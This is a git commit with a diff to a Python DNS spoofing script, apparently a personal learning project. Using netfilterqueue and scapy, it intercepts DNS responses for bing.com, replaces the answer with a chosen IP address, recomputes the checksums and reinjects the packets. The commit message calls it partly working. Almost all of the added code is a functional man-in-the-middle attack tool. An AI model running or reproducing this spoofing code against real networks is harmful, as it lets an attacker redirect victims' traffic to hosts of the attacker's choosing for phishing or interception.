28ff71c88885e02733eea821ff4dc67ecac2b2ef
ariyonaty <ari.h.yonaty@gmail.com>
2021-05-31 03:16:54 +0000

    DNS Spoofer. Kinda works, but not realistic with external sites.

--- DNS_Spoof/dns_spoof.py
+++ DNS_Spoof/dns_spoof.py
@@ -1,12 +1,29 @@
 #!/usr/bin/env python
 
 import netfilterqueue
+import scapy.packet
 from scapy.all import IP
 
+
 def process_packet(packet):
-    scapy_packet = IP(packet.get_payload)
+    scapy_packet = IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.all.DNSRR):
+        qname = scapy_packet[scapy.all.DNSQR].qname
+        if b'bing.com' in qname:
+            print("[+] Spoofing target.")
+            answer = scapy.all.DNSRR(rrname=qname, rdata='1.1.1.1')
+            scapy_packet[scapy.all.DNS].an = answer
+            scapy_packet[scapy.all.DNS].ancount = 1
+            
+            del scapy_packet[scapy.all.IP].len
+            del scapy_packet[scapy.all.IP].chksum
+            del scapy_packet[scapy.all.UDP].len
+            del scapy_packet[scapy.all.UDP].chksum
+
+            packet.set_payload(bytes(scapy_packet))
+
+        # print(scapy_packet.show())
     # print(packet.get_payload())
-    print(scapy_packet.show())
     packet.accept()
 
 
